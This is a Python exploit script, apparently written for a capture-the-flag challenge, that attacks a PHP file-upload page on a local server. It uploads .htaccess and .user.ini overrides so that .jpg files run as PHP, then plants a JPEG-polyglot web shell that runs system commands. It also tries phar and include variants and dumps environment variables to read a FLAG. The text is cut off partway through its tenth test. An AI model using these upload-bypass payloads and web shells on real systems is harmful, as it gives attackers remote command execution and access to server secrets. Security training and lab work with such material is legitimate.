import requests

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\x09\x09'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Upload .htaccess to treat .jpg as PHP
print("[*] TEST 1: Upload .htaccess to execute PHP in .jpg files")
htaccess = b'AddType application/x-httpd-php .jpg\nAddHandler php-script .jpg'
files = {'userfile': ('.htaccess', htaccess, 'text/plain')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Verify .htaccess
htaccess_check = requests.get(f"{base_url}/upload/.htaccess")
print(f"[+] .htaccess accessible: {htaccess_check.status_code}")
if htaccess_check.status_code == 200:
    print(f"[+] .htaccess content: {htaccess_check.text}")

# Now upload shell.jpg with PHP and try to execute
print("\n[*] TEST 2: Upload shell with PHP and execute after .htaccess")
shell_jpg = jpeg_content + b'<?php system($_GET["cmd"]); ?>'
files = {'userfile': ('exec.jpg', shell_jpg, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Try to execute command
exec_attempt = requests.get(f"{base_url}/upload/exec.jpg?cmd=id")
print(f"[+] Exec attempt status: {exec_attempt.status_code}")
print(f"[+] Response: {exec_attempt.text}")
if 'uid=' in exec_attempt.text:
    print("[!] RCE SUCCESSFUL!")

# Test 3: Try different .htaccess configurations
print("\n[*] TEST 3: Alternative .htaccess configuration")
htaccess2 = b'<FilesMatch "\.jpg$">\nSetHandler application/x-httpd-php\n</FilesMatch>'
files = {'userfile': ('.htaccess', htaccess2, 'text/plain')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

exec_attempt2 = requests.get(f"{base_url}/upload/exec.jpg?cmd=id")
print(f"[+] Exec attempt: {exec_attempt2.status_code}")
print(f"[+] Response: {exec_attempt2.text}")

# Test 4: Try using auto_prepend_file
print("\n[*] TEST 4: .user.ini configuration")
user_ini = b'auto_prepend_file=exec.jpg'
files = {'userfile': ('.user.ini', user_ini, 'text/plain')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

ini_check = requests.get(f"{base_url}/upload/.user.ini")
print(f"[+] .user.ini accessible: {ini_check.status_code}")

# Test 5: Try php.ini auto_prepend_file approach
print("\n[*] TEST 5: .htaccess with auto_prepend_file")
htaccess3 = b'php_value auto_prepend_file "exec.jpg"'
files = {'userfile': ('.htaccess', htaccess3, 'text/plain')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Access any .php file to trigger prepend
php_trigger = requests.get(f"{base_url}/index.php")
print(f"[+] PHP trigger: {php_trigger.status_code}")
print(f"[+] Response: {php_trigger.text}")

# Test 6: Check for existing PHP files
print("\n[*] TEST 6: Check for existing PHP files in upload")
existing_php = requests.get(f"{base_url}/upload/test.php")
print(f"[+] test.php: {existing_php.status_code}")

# Test 7: Upload a .php file that references our shell
print("\n[*] TEST 7: Upload .php file that includes our shell.jpg")
php_include = b'<?php include "exec.jpg"; ?>'
files = {'userfile': ('include.php.jpg', jpeg_content + php_include, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Test 8: Use phar:// wrapper
print("\n[*] TEST 8: Create and test phar file")
# First create a simple phar-based payload
phar_content = jpeg_content + b'<?php __HALT_COMPILER(); ?>'
files = {'userfile': ('test.phar.jpg', phar_content, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Test 9: Environment variables hint - check for FLAG in env
print("\n[*] TEST 9: Check environment variables via uploaded shell")
env_shell = jpeg_content + b'<?php print_r($_ENV); ?>'
files = {'userfile': ('env.jpg', env_shell, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

env_check = requests.get(f"{base_url}/upload/env.jpg")
print(f"[+] ENV check: {env_check.status_code}")
print(f"[+] Response: {env_check.text}")

# Test 10: getenv approach
print("\n[*] TEST 10: getenv() approach")
getenv_shell = jpeg_content + b'<?php echo getenv("FLAG"); ?>'
files = {'userfile': ('flag.jpg', getenv_shell, 'image/jpeg')}
